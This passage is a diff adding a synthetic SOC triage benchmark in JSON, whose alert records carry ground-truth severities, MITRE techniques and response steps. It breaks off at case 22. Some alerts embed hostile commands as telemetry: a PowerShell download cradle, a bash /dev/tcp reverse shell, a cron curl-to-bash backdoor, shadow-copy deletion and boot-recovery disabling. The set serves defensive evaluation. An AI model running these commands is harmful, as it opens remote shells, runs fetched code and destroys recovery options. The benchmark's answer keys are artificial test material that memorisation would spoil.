@@ -1,0 +1,1222 @@
+{
+  "dataset_version": "v2",
+  "description": "Curated, versioned SOC evaluation benchmark containing 40 synthetic security alert scenarios across 10 tactical categories. Ground truth is strictly authored from alert telemetry, MITRE ATT&CK technique definitions, and verified CVE mappings. All scenarios are explicitly labelled synthetic with negative controls (benign events) included.",
+  "synthetic": true,
+  "provenance": {
+    "origin": "Curated synthetic security telemetry based on Wazuh v4.x alert schemas, MITRE ATT&CK Enterprise Matrix, and RFC 5737/1918 addressing.",
+    "is_real_wazuh": false,
+    "review_status": "Formally validated ground-truth with documented severity and benign rationale."
+  },
+  "ground_truth_sources": [
+    "Alert payload fields (indicators, rule metadata, process lineage)",
+    "MITRE ATT&CK Enterprise Matrix (attack.mitre.org)",
+    "NIST National Vulnerability Database (NVD CVEs)",
+    "Independent security analyst curation"
+  ],
+  "cases": [
+    {
+      "case_id": "case-01-ssh-bruteforce",
+      "category": "credential_access",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-001",
+        "timestamp": "2026-06-01T08:12:00.000+0000",
+        "rule": {
+          "id": "5710",
+          "level": 10,
+          "description": "sshd: Attempt to login using a non-existent user",
+          "groups": ["authentication_failed", "syslog"],
+          "mitre": {"id": ["T1110"], "tactic": ["Credential Access"]}
+        },
+        "agent": {"id": "001", "name": "linux-lab", "os": {"name": "Ubuntu", "version": "22.04"}},
+        "data": {"srcip": "198.51.100.77", "srcport": 51022, "dstuser": "admin-test", "protocol": "sshd"},
+        "location": "/var/log/auth.log"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "high",
+        "expected_techniques": ["T1110", "T1110.001"],
+        "expected_cves": [],
+        "expected_indicators": ["198.51.100.77", "admin-test"],
+        "expected_direction": "Correlate additional failed SSH logins from 198.51.100.77 across hosts; check whether any attempt later succeeded; consider blocking or rate-limiting the source.",
+        "relevant_knowledge_ids": ["T1110", "T1110.001", "T1110.002", "T1110.003"],
+        "severity_rationale": "High-velocity authentication failure against public SSH daemon indicates external brute-force credential access attempt."
+      },
+      "notes": "Single visible failed SSH login for non-existent user from external IP; classic brute-force indicator (T1110)."
+    },
+    {
+      "case_id": "case-02-password-spray",
+      "category": "credential_access",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-002",
+        "timestamp": "2026-06-02T11:40:00.000+0000",
+        "rule": {
+          "id": "92650",
+          "level": 10,
+          "description": "Possible password spraying against cloud accounts: many authentication failures for different users from one source",
+          "groups": ["authentication_failed", "cloud"],
+          "mitre": {"id": ["T1110.003"], "tactic": ["Credential Access"]}
+        },
+        "agent": {"id": "010", "name": "idp-01", "os": {"name": "Linux", "version": "20.04"}},
+        "data": {"srcip": "203.0.113.50", "dstuser": "multiple-users", "protocol": "https"},
+        "location": "idp-auth-logs"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "high",
+        "expected_techniques": ["T1110.003", "T1110"],
+        "expected_cves": [],
+        "expected_indicators": ["203.0.113.50"],
+        "expected_direction": "Enumerate targeted accounts, check for any successful authentication from 203.0.113.50, review MFA bypass attempts, block the source.",
+        "relevant_knowledge_ids": ["T1110.003", "T1110"],
+        "severity_rationale": "Systematic password spraying against enterprise IdP aims to compromise user accounts while evading account lockout thresholds."
+      },
+      "notes": "Many distinct usernames failing authentication from one external source is the signature of password spraying (T1110.003)."
+    },
+    {
+      "case_id": "case-03-kerberoasting",
+      "category": "credential_access",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-003",
+        "timestamp": "2026-06-03T09:15:00.000+0000",
+        "rule": {
+          "id": "92660",
+          "level": 11,
+          "description": "Active Directory: Abnormal volume of Kerberos TGS ticket requests with RC4 encryption",
+          "groups": ["windows", "active_directory", "credential_access"],
+          "mitre": {"id": ["T1558.003"], "tactic": ["Credential Access"]}
+        },
+        "agent": {"id": "030", "name": "dc-primary-01", "os": {"name": "Windows", "version": "Server 2022"}},
+        "data": {"srcip": "10.0.1.45", "dstuser": "svc_sql_prod", "encryption_type": "0x17", "protocol": "kerberos"},
+        "location": "Security.evtx"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "high",
+        "expected_techniques": ["T1558.003", "T1558"],
+        "expected_cves": [],
+        "expected_indicators": ["10.0.1.45", "svc_sql_prod"],
+        "expected_direction": "Identify the compromised workstation 10.0.1.45 requesting Kerberos service tickets; reset password for svc_sql_prod with high-entropy passphrase; upgrade service ticket encryption to AES256.",
+        "relevant_knowledge_ids": ["T1558.003", "T1558"],
+        "severity_rationale": "Requesting TGS tickets with legacy RC4 (0x17) encryption indicates an adversary extracting ticket hashes for offline password cracking."
+      },
+      "notes": "Kerberoasting targets Active Directory service accounts with SPNs configured (T1558.003)."
+    },
+    {
+      "case_id": "case-04-mfa-fatigue-bombing",
+      "category": "credential_access",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-004",
+        "timestamp": "2026-06-04T02:22:00.000+0000",
+        "rule": {
+          "id": "92670",
+          "level": 11,
+          "description": "IdP: Excessive MFA push notifications denied followed by successful approval from anomalous geolocation",
+          "groups": ["cloud", "authentication", "credential_access"],
+          "mitre": {"id": ["T1621"], "tactic": ["Credential Access"]}
+        },
+        "agent": {"id": "010", "name": "idp-01", "os": {"name": "Linux", "version": "20.04"}},
+        "data": {"srcip": "198.51.100.199", "dstuser": "sarah.admin", "push_denied_count": 14, "push_approved": true},
+        "location": "idp-audit.log"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "high",
+        "expected_techniques": ["T1621", "T1078"],
+        "expected_cves": [],
+        "expected_indicators": ["198.51.100.199", "sarah.admin"],
+        "expected_direction": "Revoke active session tokens for sarah.admin immediately; enforce number matching or FIDO2 hardware keys; contact user to confirm whether prompt was approved under coercion/fatigue.",
+        "relevant_knowledge_ids": ["T1621", "T1078"],
+        "severity_rationale": "Repeated denied MFA pushes followed by an approval from an anomalous external IP indicates MFA fatigue prompt bombing."
+      },
+      "notes": "MFA request generation / prompt spamming (T1621) designed to fatigue the victim into approving."
+    },
+    {
+      "case_id": "case-05-encoded-powershell",
+      "category": "suspicious_script",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-005",
+        "timestamp": "2026-06-05T17:31:00.000+0000",
+        "rule": {
+          "id": "92032",
+          "level": 10,
+          "description": "Windows: PowerShell launched with encoded command from Word document directory",
+          "groups": ["windows", "powershell"],
+          "mitre": {"id": ["T1059.001", "T1027"], "tactic": ["Execution", "Defense Evasion"]}
+        },
+        "agent": {"id": "040", "name": "win-work-07", "os": {"name": "Windows", "version": "11"}},
+        "data": {"dstuser": "jdoe", "process": "powershell.exe", "parent_process": "winword.exe", "command": "powershell -enc SQBFAFgA-..."},
+        "location": "Sysmon.evtx"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "high",
+        "expected_techniques": ["T1059.001", "T1027"],
+        "expected_cves": [],
+        "expected_indicators": ["powershell.exe", "jdoe", "winword.exe"],
+        "expected_direction": "Decode the -enc payload in a sandbox, review winword.exe child process tree, collect the script block logging, check persistence and network callbacks from the host.",
+        "relevant_knowledge_ids": ["T1059.001", "T1027"],
+        "severity_rationale": "Office application spawning an encoded PowerShell command is an abnormal execution pattern typical of weaponized documents."
+      },
+      "notes": "Office spawning an encoded PowerShell command is a malicious-document execution pattern (T1059.001 with obfuscation, T1027)."
+    },
+    {
+      "case_id": "case-06-powershell-download-cradle",
+      "category": "suspicious_script",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-006",
+        "timestamp": "2026-06-06T14:10:00.000+0000",
+        "rule": {
+          "id": "92035",
+          "level": 11,
+          "description": "Windows: PowerShell executing in-memory download cradle from external IP",
+          "groups": ["windows", "powershell", "execution"],
+          "mitre": {"id": ["T1059.001", "T1105"], "tactic": ["Execution", "Command and Control"]}
+        },
+        "agent": {"id": "041", "name": "win-fin-02", "os": {"name": "Windows", "version": "11"}},
+        "data": {"dstuser": "accounting01", "process": "powershell.exe", "command": "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.89/stage1.ps1')"},
+        "location": "Sysmon.evtx"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "high",
+        "expected_techniques": ["T1059.001", "T1105"],
+        "expected_cves": [],
+        "expected_indicators": ["powershell.exe", "198.51.100.89", "stage1.ps1"],
+        "expected_direction": "Isolate workstation win-fin-02, capture memory for staged payload, block IP 198.51.100.89 at perimeter firewall, inspect script block log event 4104.",
+        "relevant_knowledge_ids": ["T1059.001", "T1105"],
+        "severity_rationale": "Hidden window execution downloading remote code directly into memory bypasses disk-based scanning."
+      },
+      "notes": "Living-off-the-land PowerShell download cradle retrieving secondary payload (T1059.001, T1105)."
+    },
+    {
+      "case_id": "case-07-suspicious-wscript-launch",
+      "category": "suspicious_script",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-007",
+        "timestamp": "2026-06-07T10:45:00.000+0000",
+        "rule": {
+          "id": "92040",
+          "level": 10,
+          "description": "Windows: WScript executing VBScript from user Temp directory",
+          "groups": ["windows", "execution"],
+          "mitre": {"id": ["T1059.005"], "tactic": ["Execution"]}
+        },
+        "agent": {"id": "042", "name": "win-exec-03", "os": {"name": "Windows", "version": "10"}},
+        "data": {"dstuser": "cfo-user", "process": "wscript.exe", "file": "C:\\Users\\cfo-user\\AppData\\Local\\Temp\\invoice_details.vbs"},
+        "location": "Sysmon.evtx"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "high",
+        "expected_techniques": ["T1059.005"],
+        "expected_cves": [],
+        "expected_indicators": ["wscript.exe", "invoice_details.vbs"],
+        "expected_direction": "Collect and analyze invoice_details.vbs; review parent process to identify initial delivery vector (e.g. email attachment in Outlook); inspect child processes spawned by wscript.",
+        "relevant_knowledge_ids": ["T1059.005"],
+        "severity_rationale": "VBScript executed from user Temp folder commonly indicates email attachment malicious execution."
+      },
+      "notes": "Visual Basic script execution via Windows Script Host (T1059.005)."
+    },
+    {
+      "case_id": "case-08-bash-reverse-shell",
+      "category": "suspicious_script",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-008",
+        "timestamp": "2026-06-08T23:14:00.000+0000",
+        "rule": {
+          "id": "5503",
+          "level": 12,
+          "description": "Linux: Interactive bash shell spawned with redirected socket to external IP",
+          "groups": ["syslog", "execution", "c2"],
+          "mitre": {"id": ["T1059.004", "T1071"], "tactic": ["Execution", "Command and Control"]}
+        },
+        "agent": {"id": "020", "name": "app-prod-02", "os": {"name": "CentOS", "version": "9"}},
+        "data": {"dstuser": "www-data", "process": "bash", "command": "bash -i >& /dev/tcp/198.51.100.44/4444 0>&1"},
+        "location": "/var/log/audit/audit.log"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "critical",
+        "expected_techniques": ["T1059.004", "T1071"],
+        "expected_cves": [],
+        "expected_indicators": ["bash", "198.51.100.44", "4444", "www-data"],
+        "expected_direction": "Terminate bash reverse shell session immediately; isolate server app-prod-02; inspect web server access logs around timestamp to locate the web exploitation vector; audit user www-data permissions.",
+        "relevant_knowledge_ids": ["T1059.004", "T1071"],
+        "severity_rationale": "Interactive reverse shell spawned by web server user directly establishes interactive command-and-control access."
+      },
+      "notes": "Classic Unix bash interactive TCP socket redirection (T1059.004)."
+    },
+    {
+      "case_id": "case-09-shadow-copy-deletion",
+      "category": "malware_ransomware",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-009",
+        "timestamp": "2026-06-09T22:55:00.000+0000",
+        "rule": {
+          "id": "92200",
+          "level": 15,
+          "description": "Windows: vssadmin delete shadows executed followed by mass file extension changes",
+          "groups": ["windows", "ransomware"],
+          "mitre": {"id": ["T1490", "T1486"], "tactic": ["Impact"]}
+        },
+        "agent": {"id": "040", "name": "win-work-07", "os": {"name": "Windows", "version": "11"}},
+        "data": {"dstuser": "jdoe", "process": "vssadmin.exe", "command": "vssadmin delete shadows /all /quiet"},
+        "location": "Security.evtx"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "critical",
+        "expected_techniques": ["T1490", "T1486"],
+        "expected_cves": [],
+        "expected_indicators": ["vssadmin.exe", "jdoe"],
+        "expected_direction": "Isolate the host from the network immediately, identify the ransomware process and patient zero, check backup integrity, scope the blast radius via EDR before remediation.",
+        "relevant_knowledge_ids": ["T1490", "T1486"],
+        "severity_rationale": "Deleting volume shadow copies is destructive ransomware preparation to prevent local data restoration."
+      },
+      "notes": "Shadow-copy deletion plus mass file renaming is destructive ransomware preparation (T1490 Inhibit System Recovery, T1486 Data Encrypted for Impact)."
+    },
+    {
+      "case_id": "case-10-bcdr-disable-recovery",
+      "category": "malware_ransomware",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-010",
+        "timestamp": "2026-06-10T03:12:00.000+0000",
+        "rule": {
+          "id": "92205",
+          "level": 13,
+          "description": "Windows: BCDEdit executed to disable Windows Startup Recovery and Ignore Failures",
+          "groups": ["windows", "defense_evasion", "impact"],
+          "mitre": {"id": ["T1490"], "tactic": ["Impact"]}
+        },
+        "agent": {"id": "031", "name": "win-srv-sql", "os": {"name": "Windows", "version": "Server 2022"}},
+        "data": {"dstuser": "SYSTEM", "process": "bcdedit.exe", "command": "bcdedit /set {default} recoveryenabled No & bcdedit /set {default} bootstatuspolicy ignoreallfailures"},
+        "location": "Security.evtx"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "critical",
+        "expected_techniques": ["T1490"],
+        "expected_cves": [],
+        "expected_indicators": ["bcdedit.exe", "win-srv-sql"],
+        "expected_direction": "Immediately isolate database server; check for concurrent file encryption or wiper activity; identify parent process that spawned bcdedit.",
+        "relevant_knowledge_ids": ["T1490"],
+        "severity_rationale": "Tampering with BCD configuration to disable automated recovery is a hallmark of ransomware/wiper impact stages."
+      },
+      "notes": "Inhibit system recovery via boot configuration manipulation (T1490)."
+    },
+    {
+      "case_id": "case-11-ransom-note-drop",
+      "category": "malware_ransomware",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-011",
+        "timestamp": "2026-06-11T04:05:00.000+0000",
+        "rule": {
+          "id": "92210",
+          "level": 14,
+          "description": "FIM: Rapid creation of ransom note files across multiple directories",
+          "groups": ["fim", "ransomware", "impact"],
+          "mitre": {"id": ["T1486"], "tactic": ["Impact"]}
+        },
+        "agent": {"id": "032", "name": "fs-corporate", "os": {"name": "Windows", "version": "Server 2019"}},
+        "data": {"process": "encryptor.exe", "file": "D:\\Shares\\Finance\\HOW_TO_DECRYPT_FILES.txt", "file_count": 850},
+        "location": "FIM-events"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "critical",
+        "expected_techniques": ["T1486"],
+        "expected_cves": [],
+        "expected_indicators": ["HOW_TO_DECRYPT_FILES.txt", "encryptor.exe", "fs-corporate"],
+        "expected_direction": "Sever network connection of file server fs-corporate immediately to halt network share encryption; initiate disaster recovery plan; preserve encrypted samples and ransom note.",
+        "relevant_knowledge_ids": ["T1486"],
+        "severity_rationale": "High-speed dropping of decryption instructions accompanied by mass file modification signifies active ransomware execution."
+      },
+      "notes": "Data encrypted for impact and extortion note delivery (T1486)."
+    },
+    {
+      "case_id": "case-12-suspicious-svchost-spawn",
+      "category": "malware_ransomware",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-012",
+        "timestamp": "2026-06-12T11:20:00.000+0000",
+        "rule": {
+          "id": "92050",
+          "level": 11,
+          "description": "Windows: svchost.exe executed from atypical path (C:\\Users\\Public)",
+          "groups": ["windows", "defense_evasion", "masquerading"],
+          "mitre": {"id": ["T1036.005", "T1055"], "tactic": ["Defense Evasion"]}
+        },
+        "agent": {"id": "043", "name": "win-hr-01", "os": {"name": "Windows", "version": "11"}},
+        "data": {"dstuser": "hr-specialist", "process": "svchost.exe", "path": "C:\\Users\\Public\\svchost.exe", "parent_process": "cmd.exe"},
+        "location": "Sysmon.evtx"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "high",
+        "expected_techniques": ["T1036.005", "T1036"],
+        "expected_cves": [],
+        "expected_indicators": ["C:\\Users\\Public\\svchost.exe", "win-hr-01"],
+        "expected_direction": "Kill rogue svchost process; hash binary from C:\\Users\\Public and query threat intelligence; quarantine workstation; review persistence entries referencing the rogue binary.",
+        "relevant_knowledge_ids": ["T1036.005", "T1036"],
+        "severity_rationale": "Critical Windows system binaries running outside System32 indicate masquerading malware."
+      },
+      "notes": "Masquerading: Match Legitimate Name or Location (T1036.005)."
+    },
+    {
+      "case_id": "case-13-sudoers-modification",
+      "category": "privilege_escalation",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-013",
+        "timestamp": "2026-06-13T09:47:00.000+0000",
+        "rule": {
+          "id": "5402",
+          "level": 12,
+          "description": "sshd: sudoers file modified adding NOPASSWD entry",
+          "groups": ["syslog", "privilege_escalation"],
+          "mitre": {"id": ["T1548.003"], "tactic": ["Privilege Escalation", "Defense Evasion"]}
+        },
+        "agent": {"id": "001", "name": "linux-lab", "os": {"name": "Ubuntu", "version": "22.04"}},
+        "data": {"dstuser": "svc-backup", "process": "visudo", "file": "/etc/sudoers"},
+        "location": "/var/log/auth.log"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "critical",
+        "expected_techniques": ["T1548.003", "T1548"],
+        "expected_cves": [],
+        "expected_indicators": ["svc-backup", "/etc/sudoers"],
+        "expected_direction": "Verify who modified /etc/sudoers and from where, determine whether svc-backup has NOPASSWD root, check shell history and recent logins for the modifying account.",
+        "relevant_knowledge_ids": ["T1548.003", "T1548"],
+        "severity_rationale": "A NOPASSWD sudoers entry grants passwordless privilege escalation (T1548.003)."
+      },
+      "notes": "A NOPASSWD sudoers entry grants passwordless privilege escalation (T1548.003, Sudo and Sudo Caching)."
+    },
+    {
+      "case_id": "case-14-suid-binary-creation",
+      "category": "privilege_escalation",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-014",
+        "timestamp": "2026-06-14T16:05:00.000+0000",
+        "rule": {
+          "id": "5507",
+          "level": 12,
+          "description": "Linux: New SUID root binary created in temporary directory",
+          "groups": ["syslog", "privilege_escalation"],
+          "mitre": {"id": ["T1548.001"], "tactic": ["Privilege Escalation", "Defense Evasion"]}
+        },
+        "agent": {"id": "002", "name": "srv-bastion", "os": {"name": "Debian", "version": "12"}},
+        "data": {"dstuser": "nobody", "process": "chmod", "command": "chmod u+s /tmp/.rootshell", "file": "/tmp/.rootshell"},
+        "location": "/var/log/audit/audit.log"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "critical",
+        "expected_techniques": ["T1548.001", "T1548"],
+        "expected_cves": [],
+        "expected_indicators": ["/tmp/.rootshell", "chmod u+s", "nobody"],
+        "expected_direction": "Remove the SUID bit and delete /tmp/.rootshell; identify the process lineage that compiled or dropped the file; review authentication logs for the nobody account.",
+        "relevant_knowledge_ids": ["T1548.001", "T1548"],
+        "severity_rationale": "Setting the SUID bit on a hidden binary in /tmp allows unprivileged accounts to spawn root shells."
+      },
+      "notes": "Setuid and Setgid privilege abuse (T1548.001)."
+    },
+    {
+      "case_id": "case-15-uac-bypass-fodhelper",
+      "category": "privilege_escalation",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-015",
+        "timestamp": "2026-06-15T13:40:00.000+0000",
+        "rule": {
+          "id": "92120",
+          "level": 11,
+          "description": "Windows: Potential UAC Bypass via Fodhelper Registry Hijack",
+          "groups": ["windows", "privilege_escalation", "defense_evasion"],
+          "mitre": {"id": ["T1548.002"], "tactic": ["Privilege Escalation", "Defense Evasion"]}
+        },
+        "agent": {"id": "044", "name": "win-ops-05", "os": {"name": "Windows", "version": "11"}},
+        "data": {"dstuser": "localadmin", "process": "fodhelper.exe", "registry_key": "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command"},
+        "location": "Sysmon.evtx"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "high",
+        "expected_techniques": ["T1548.002"],
+        "expected_cves": [],
+        "expected_indicators": ["fodhelper.exe", "ms-settings\\Shell\\Open\\command"],
+        "expected_direction": "Clean malicious registry key under HKCU ms-settings; identify process that wrote the registry value; review elevated processes spawned by fodhelper.exe.",
+        "relevant_knowledge_ids": ["T1548.002"],
+        "severity_rationale": "Fodhelper registry hijacking bypasses Windows User Account Control (UAC) to execute arbitrary commands with high integrity."
+      },
+      "notes": "Bypass User Account Control via fodhelper (T1548.002)."
+    },
+    {
+      "case_id": "case-16-token-privilege-abuse",
+      "category": "privilege_escalation",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-016",
+        "timestamp": "2026-06-16T18:25:00.000+0000",
+        "rule": {
+          "id": "92130",
+          "level": 12,
+          "description": "Windows: SeDebugPrivilege enabled and lsass.exe process handle opened with PROCESS_ALL_ACCESS",
+          "groups": ["windows", "privilege_escalation", "credential_access"],
+          "mitre": {"id": ["T1134.001", "T1003.001"], "tactic": ["Privilege Escalation", "Credential Access"]}
+        },
+        "agent": {"id": "030", "name": "dc-primary-01", "os": {"name": "Windows", "version": "Server 2022"}},
+        "data": {"dstuser": "dadmin", "process": "rundll32.exe", "target_process": "lsass.exe", "access_mask": "0x1FFFFF"},
+        "location": "Sysmon.evtx"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "critical",
+        "expected_techniques": ["T1134.001", "T1003.001"],
+        "expected_cves": [],
+        "expected_indicators": ["rundll32.exe", "lsass.exe", "dadmin"],
+        "expected_direction": "Isolate domain controller; investigate rundll32 command line arguments; check if LSASS memory dump file was created (e.g. comsvcs.dll mini dump); rotate all administrative domain credentials.",
+        "relevant_knowledge_ids": ["T1134.001", "T1003.001"],
+        "severity_rationale": "Acquiring full access to LSASS memory allows adversaries to extract plaintext passwords and NTLM hashes."
+      },
+      "notes": "Access Token Manipulation and LSASS Memory Credential Dumping (T1134.001, T1003.001)."
+    },
+    {
+      "case_id": "case-17-scheduled-task-persistence",
+      "category": "persistence",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-017",
+        "timestamp": "2026-06-17T03:05:00.000+0000",
+        "rule": {
+          "id": "92900",
+          "level": 10,
+          "description": "Windows: new scheduled task created by non-interactive session running from Temp directory",
+          "groups": ["windows", "persistence"],
+          "mitre": {"id": ["T1053.005"], "tactic": ["Persistence", "Privilege Escalation"]}
+        },
+        "agent": {"id": "030", "name": "win-srv-01", "os": {"name": "Windows", "version": "Server 2022"}},
+        "data": {"dstuser": "SYSTEM", "process": "schtasks.exe", "file": "C:\\Windows\\Temp\\update_check.exe"},
+        "location": "Security.evtx"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "high",
+        "expected_techniques": ["T1053.005", "T1053"],
+        "expected_cves": [],
+        "expected_indicators": ["update_check.exe", "C:\\Windows\\Temp\\update_check.exe"],
+        "expected_direction": "Inspect the scheduled task definition and binary, check binary signature and origin, review recent process lineage that created it, hunt the same task on other hosts.",
+        "relevant_knowledge_ids": ["T1053.005", "T1053"],
+        "severity_rationale": "New scheduled task from a Temp-directory binary in a non-interactive session is classic scheduled-task persistence (T1053.005)."
+      },
+      "notes": "New scheduled task from a Temp-directory binary in a non-interactive session is classic scheduled-task persistence (T1053.005)."
+    },
+    {
+      "case_id": "case-18-registry-run-key",
+      "category": "persistence",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-018",
+        "timestamp": "2026-06-18T15:20:00.000+0000",
+        "rule": {
+          "id": "92140",
+          "level": 10,
+          "description": "Windows: Registry Run key modified to execute binary from user AppData",
+          "groups": ["windows", "persistence"],
+          "mitre": {"id": ["T1547.001"], "tactic": ["Persistence"]}
+        },
+        "agent": {"id": "045", "name": "win-sales-04", "os": {"name": "Windows", "version": "11"}},
+        "data": {"dstuser": "mroberts", "registry_key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "value_name": "EdgeUpdater", "value_data": "C:\\Users\\mroberts\\AppData\\Roaming\\msedge_updater.exe"},
+        "location": "Sysmon.evtx"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "high",
+        "expected_techniques": ["T1547.001"],
+        "expected_cves": [],
+        "expected_indicators": ["EdgeUpdater", "msedge_updater.exe"],
+        "expected_direction": "Delete malicious Run key entry; retrieve and quarantine msedge_updater.exe; examine creation timestamp and origin.",
+        "relevant_knowledge_ids": ["T1547.001"],
+        "severity_rationale": "Modifying user Run keys ensures persistence upon user logon, masquerading as a legitimate software update."
+      },
+      "notes": "Boot or Logon Autostart Execution: Registry Run Keys (T1547.001)."
+    },
+    {
+      "case_id": "case-19-linux-cron-backdoor",
+      "category": "persistence",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-019",
+        "timestamp": "2026-06-19T02:00:00.000+0000",
+        "rule": {
+          "id": "5304",
+          "level": 11,
+          "description": "Linux: New cron job installed executing external curl payload every 10 minutes",
+          "groups": ["syslog", "persistence"],
+          "mitre": {"id": ["T1053.003"], "tactic": ["Persistence"]}
+        },
+        "agent": {"id": "001", "name": "linux-lab", "os": {"name": "Ubuntu", "version": "22.04"}},
+        "data": {"dstuser": "root", "file": "/etc/cron.d/sys-sync", "command": "*/10 * * * * root curl -s http://198.51.100.99/sync.sh | bash"},
+        "location": "/var/log/cron.log"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "high",
+        "expected_techniques": ["T1053.003", "T1059.004"],
+        "expected_cves": [],
+        "expected_indicators": ["/etc/cron.d/sys-sync", "198.51.100.99", "sync.sh"],
+        "expected_direction": "Remove cron file /etc/cron.d/sys-sync; block egress to 198.51.100.99; check running processes spawned by cron; inspect how root access was obtained.",
+        "relevant_knowledge_ids": ["T1053.003", "T1059.004"],
+        "severity_rationale": "Recurring root cron execution piping external script directly into bash guarantees persistent unauthorized remote code execution."
+      },
+      "notes": "Scheduled Task/Job: Cron (T1053.003)."
+    },
+    {
+      "case_id": "case-20-new-system-service",
+      "category": "persistence",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-020",
+        "timestamp": "2026-06-20T19:30:00.000+0000",
+        "rule": {
+          "id": "92150",
+          "level": 11,
+          "description": "Windows: New system service installed executing from writable public directory",
+          "groups": ["windows", "persistence", "privilege_escalation"],
+          "mitre": {"id": ["T1543.003"], "tactic": ["Persistence", "Privilege Escalation"]}
+        },
+        "agent": {"id": "031", "name": "win-srv-sql", "os": {"name": "Windows", "version": "Server 2022"}},
+        "data": {"dstuser": "SYSTEM", "service_name": "WinDefendSupport", "binary_path": "C:\\Users\\Public\\Downloads\\support_svc.exe"},
+        "location": "System.evtx"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "high",
+        "expected_techniques": ["T1543.003"],
+        "expected_cves": [],
+        "expected_indicators": ["WinDefendSupport", "support_svc.exe"],
+        "expected_direction": "Stop and delete WinDefendSupport service using sc.exe; quarantine support_svc.exe; review which user session created the service.",
+        "relevant_knowledge_ids": ["T1543.003"],
+        "severity_rationale": "Windows service creation executing out of Public directories achieves persistence with SYSTEM level privileges."
+      },
+      "notes": "Create or Modify System Process: Windows Service (T1543.003)."
+    },
+    {
+      "case_id": "case-21-dns-data-tunneling",
+      "category": "suspicious_network",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-021",
+        "timestamp": "2026-06-21T01:40:00.000+0000",
+        "rule": {
+          "id": "93010",
+          "level": 11,
+          "description": "Network: High-volume anomalous high-entropy DNS TXT queries to non-standard domain",
+          "groups": ["network", "dns", "c2", "exfiltration"],
+          "mitre": {"id": ["T1071.004", "T1048"], "tactic": ["Command and Control", "Exfiltration"]}
+        },
+        "agent": {"id": "050", "name": "fw-edge", "os": {"name": "Linux", "version": "24.04"}},
+        "data": {"srcip": "10.0.2.88", "query_count": 4800, "domain": "tunnel.exfil-c2.net", "query_type": "TXT"},
+        "location": "named.log"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "high",
+        "expected_techniques": ["T1071.004", "T1048"],
+        "expected_cves": [],
+        "expected_indicators": ["10.0.2.88", "tunnel.exfil-c2.net"],
+        "expected_direction": "Sinkhole domain tunnel.exfil-c2.net on internal DNS; identify process running on 10.0.2.88 querying DNS; capture PCAP to analyze encoded exfiltration payload.",
+        "relevant_knowledge_ids": ["T1071.004", "T1048"],
+        "severity_rationale": "Thousands of high-entropy DNS queries indicate DNS tunneling used for covert data exfiltration or C2 communication."
+      },
+      "notes": "Application Layer Protocol: DNS Tunneling (T1071.004)."
+    },
+    {
+      "case_id": "case-22-c2-beaconing-fixed-jitter",
+      "category": "suspicious_network",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-022",
+        "timestamp": "2026-06-22T06:30:00.000+0000",
+        "rule": {
+          "id": "93020",
+          "level": 10,
+          "description": "Network: Periodic HTTP POST beaconing detected with low jitter to suspicious IP",
+          "groups": ["network", "c2"],
+          "mitre": {"id": ["T1071.001"], "tactic": ["Command and Control"]}
+        },
+        "agent": {"id": "050", "name": "fw-edge", "os": {"name": "Linux", "version": "24.04"}},
+        "data": {"srcip": "10.0.1.72", "dstip": "198.51.100.120", "interval_seconds": 60, "jitter_percent": 3, "uri": "/api/v1/heartbeat"},
+        "location": "zeek-http.log"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "high",
+        "expected_techniques": ["T1071.001"],
+        "expected_cves": [],
+        "expected_indicators": ["10.0.1.72", "198.51.100.120", "/api/v1/heartbeat"],
+        "expected_direction": "Block dstip 198.51.100.120 at boundary; isolate host 10.0.1.72; inspect network sockets to identify communicating process ID.",
+        "relevant_knowledge_ids": ["T1071.001"],
+        "severity_rationale": "High-frequency periodic HTTP traffic with minimal jitter is characteristic of automated malware C2 check-in."
+      },
